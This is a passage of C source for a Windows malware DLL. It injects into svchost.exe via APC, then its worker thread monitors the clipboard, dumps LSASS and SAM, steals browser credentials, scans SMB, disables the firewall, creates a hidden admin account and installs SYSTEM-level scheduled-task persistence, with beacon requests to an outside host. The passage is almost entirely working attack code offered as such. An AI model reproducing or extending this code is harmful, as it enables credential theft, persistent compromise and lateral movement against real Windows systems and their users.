            L"schtasks /create /tn \"%s\" /ru SYSTEM /tr \"%s\" /sc onlogon /f",
            TASK_NAME, SELF_INF);
        if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 30000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        LogMessage(L"[+] Persistence installed");
    }
}

static void Beacon(void) {
    {
        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
        if (!hSession) return;

        HINTERNET hConnect = WinHttpConnect(hSession, L"github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            for (int i = 0; i < BEACON_COUNT; i++) {
                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
                if (hRequest) {
                    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
                    WinHttpReceiveResponse(hRequest, NULL);
                    WinHttpCloseHandle(hRequest);
                }
                if (i < BEACON_COUNT - 1) Sleep(BEACON_SLEEP_MS);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

static DWORD WINAPI WorkerThread(LPVOID lpParam) {
    (void)lpParam;

    EnsureDirectory(L"C:\\ProgramData");
    LogMessage(L"[+] WorkerThread started");

    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18");
    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys");
    EnsureDirectory(L"C:\\ProgramData\\Microsoft\\Network");

    LogMessage(L"[*] Monitoring clipboard");
    MonitorClipboard();
    LogMessage(L"[+] Clipboard done");

    LogMessage(L"[*] Dumping LSASS");
    DumpLSASS();
    LogMessage(L"[+] LSASS dump complete");

    LogMessage(L"[*] Dumping SAM");
    DumpSAM();
    LogMessage(L"[+] SAM dump done");

    LogMessage(L"[*] Stealing browser credentials");
    StealBrowserCreds();
    LogMessage(L"[+] Browser creds done");

    LogMessage(L"[*] Running recon");
    DoRecon();
    LogMessage(L"[+] Recon done");

    LogMessage(L"[*] Running SMB scan");
    DoSMBRecon();
    LogMessage(L"[+] SMB scan done");

    LogMessage(L"[*] Disabling firewall");
    DisableFirewall();
    LogMessage(L"[+] Firewall disabled");

    LogMessage(L"[*] Creating admin account");
    CreateAdminAccount();
    LogMessage(L"[+] SupportUser created");

    LogMessage(L"[*] Installing persistence");
    InstallPersistence();
    LogMessage(L"[+] Persistence installed");

    LogMessage(L"[*] Sending beacon");
    Beacon();
    LogMessage(L"[+] Beacon done");

    LogMessage(L"[+] WorkerThread complete");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    (void)hModule;
    (void)lpReserved;
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);

        EnsureDirectory(L"C:\\ProgramData");
        wchar_t hostPath[MAX_PATH];
        GetModuleFileNameW(NULL, hostPath, MAX_PATH);
        wchar_t buf[MAX_PATH + 64];
        wsprintfW(buf, L"[+] DLL loaded — host: %s", hostPath);
        LogMessage(buf);

        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        if (strstr(path, "svchost.exe")) {
            LogMessage(L"[+] Detected svchost.exe — queuing WorkerThread");
            QueueUserWorkItem((LPTHREAD_START_ROUTINE)WorkerThread, NULL, WT_EXECUTEDEFAULT);
        } else {
            LogMessage(L"[-] Not svchost.exe — WorkerThread NOT queued");
        }
    }
    return TRUE;
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
    EnsureDirectory(L"C:\\ProgramData");
    LogMessage(L"[+] DllRegisterServer called");

    CreateDirectoryA("C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18", NULL);

    DWORD pid = FindProcessPID("svchost.exe");
    if (pid) {
        wchar_t buf[256];
        wsprintfW(buf, L"[+] svchost.exe PID=%lu — injecting APC", pid);
        LogMessage(buf);

        BOOL ok = InjectAPC(pid);
        LogMessage(ok ? L"[+] APC injection OK" : L"[-] APC injection FAILED");
    } else {
        LogMessage(L"[-] svchost.exe not found");
    }

    return S_OK;
}
